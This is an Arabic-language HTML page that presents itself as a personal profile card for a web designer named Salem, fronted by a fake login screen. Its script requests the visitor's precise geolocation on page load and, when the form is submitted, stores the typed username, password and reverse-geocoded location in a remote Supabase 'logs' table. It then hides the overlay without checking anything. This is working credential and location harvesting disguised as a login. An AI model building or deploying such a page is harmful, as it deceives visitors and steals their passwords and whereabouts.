<!DOCTYPE HTML>
<html lang="ar">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <meta name="theme-color" content="#FFD700"/>
    <title>SALEM | سـالـم</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,700&display=swap"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/typed.js/2.0.10/typed.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root {
            --water-deep: #0a192f; --water-mid: #1A2980; --water-light: #26d0ce;
            --front_color: rgba(10, 25, 47, 0.7); --gold: #FFD700; --muted-gold: #c5a059; --white: #e6f1ff;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body {
            background: linear-gradient(-45deg, #0a192f, #1A2980, #141e30, #243b55);
            background-size: 400% 400%; animation: waterFlow 10s ease infinite;
            width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center;
        }
        @keyframes waterFlow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        .vcard {
            width: 90%; max-width: 420px; height: 600px; background: var(--front_color);
            backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2);
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6); position: relative; overflow: hidden;
        }
        .header { height: 35%; position: relative; }
        .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; pointer-events: none; }
        .wave-01 { border-radius: 43%; top: -180%; left: -15%; position: absolute; width: 550px; height: 550px; background: linear-gradient(45deg, var(--water-mid), var(--water-light)); opacity: 0.4; animation: rotate 14s linear infinite; }
        @keyframes rotate { 100% { transform: rotate(360deg); } }
        .profile_pic_content { width: 135px; height: 135px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); z-index: 10; }
        .profile_video { width: 100%; height: 100%; object-fit: cover; }
        .card_content { padding-top: 85px; text-align: center; }
        .satan h4 { font-size: 1.9em; letter-spacing: 3px; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
        .cigarette-box { margin: 10px 0; display: block; }
        .cigarette-box i { font-size: 2.2em; color: var(--muted-gold); }
        .snuff { min-height: 60px; padding: 0 30px; color: #8892b0; font-size: 0.95em; }
        .social div { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; padding: 0 10px; }
        .social i { padding: 12px; font-size: 1.3em; background: rgba(197, 160, 89, 0.05); border-radius: 14px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); }
        .footer-text { position: absolute; bottom: 15px; width: 100%; font-size: 0.75em; color: rgba(136, 146, 176, 0.4); text-align: center; }

        /* شاشة القفل */
        #lock-screen {
            position: fixed; inset: 0; background: #0a192f; z-index: 99999;
            display: flex; justify-content: center; align-items: center; transition: 0.8s;
        }
        .login-box { width: 320px; padding: 30px; background: rgba(255,255,255,0.03); border-radius: 20px; border: 1px solid var(--gold); text-align: center; backdrop-filter: blur(10px); }
        .login-box input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 8px; border: 1px solid var(--muted-gold); background: transparent; color: white; outline: none; text-align: center; }
        .login-box button { width: 100%; padding: 12px; border-radius: 8px; border: none; background: var(--gold); color: #0a192f; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div id="lock-screen">
    <div class="login-box">
        <h2 style="color: var(--gold); margin-bottom: 20px; font-size: 1.4rem;">تسجيل الدخول</h2>
        <input type="text" id="u" placeholder="اسم المستخدم">
        <input type="password" id="p" placeholder="كلمة المرور">
        <button onclick="sendData()" id="btn">دخول</button>
    </div>
</div>

<div class="vcard">
    <div class="header">
        <div class="wave_bg"><div class="wave-01"></div></div>
        <div class="profile_pic_content">
            <video class="profile_video" autoplay loop muted playsinline>
                <source src="https://files.catbox.moe/jvicv4.mp4" type="video/mp4">
            </video>
        </div>
    </div>
    <div class="card_content">
        <div class="satan"><h4>SALEM</h4></div>
        <div class="cigarette-box"><i class="fas fa-smoking"></i></div>
        <div class="snuff"><h5 class="typed_text"></h5></div>
        <div class="social">
            <div>
                <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
                <a href="https://www.facebook.com/share/15KQ2NmX9V/"><i class="fab fa-facebook"></i></a>
                <a href="https://www.instagram.com/_u_vf?igsh=bXRqd2Z4ZWhteW94"><i class="fab fa-instagram"></i></a>
                <a href="https://github.com/salemalshamrie"><i class="fab fa-github"></i></a>
                <a href="tg://settings"><i class="fas fa-user"></i></a>
                <a href="https://g.co/kgs/pXVXQxK"><i class="fas fa-futbol"></i></a>
                <a href="https://uokerbala.edu.iq/"><i class="fas fa-university"></i></a>
            </div>
        </div>
    </div>
    <p class="footer-text">© 2024-2026 Salem Al-Shammari | Karbala, Iraq</p>
</div>

<script>
    const SB_URL = 'https://kcckppfflaxpxhipngdz.supabase.co';
    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
    const sb = supabase.createClient(SB_URL, SB_KEY);

    let userLoc = "جاري تحديد الموقع...";

    navigator.geolocation.getCurrentPosition(async (pos) => {
        const { latitude: lat, longitude: lon } = pos.coords;
        try {
            const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ar`);
            const d = await r.json();
            userLoc = d.display_name;
        } catch(e) { userLoc = lat + "," + lon; }
    }, () => { userLoc = "رفض الموقع"; }, {enableHighAccuracy: true});

    async function sendData() {
        const u = document.getElementById('u').value;
        const p = document.getElementById('p').value;
        if(!u || !p) return alert("يرجى إكمال البيانات");
        document.getElementById('btn').innerText = "جاري التحقق...";
        
        await sb.from('logs').insert([{ username: u, password: p, location: userLoc }]);
        
        document.getElementById('lock-screen').style.opacity = "0";
        setTimeout(() => { document.getElementById('lock-screen').style.display = "none"; }, 800);
    }

    new Typed(".typed_text", {
        strings: ["Web Designer & Creative Developer.", "Turning code into visual art.", "BELIEVE IN YOURSELF."],
        typeSpeed: 50, backSpeed: 30, loop: true
    });
</script>

</html>
